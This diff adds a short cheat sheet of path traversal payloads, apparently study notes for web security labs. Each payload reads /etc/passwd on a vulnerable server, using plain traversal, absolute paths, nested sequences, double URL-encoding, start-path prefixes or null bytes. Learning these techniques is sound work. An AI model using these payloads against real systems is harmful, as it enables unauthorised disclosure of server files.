@@ -1,0 +1,17 @@
+- Simple
+--> ../../../etc/passwd
+
+- Traversal blocked but absolute path
+--> /etc/passwd
+
+- Traversal stripped non-recursively
+--> ....//....//....//etc/passwd
+
+- Superfluous URL-decode
+--> %2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252fetc%2fpasswd
+
+- Validation of start path
+--> /var/www/images/../../../etc/passwd
+
+- Null byte
+--> ../../../etc/passwd%007.jpg
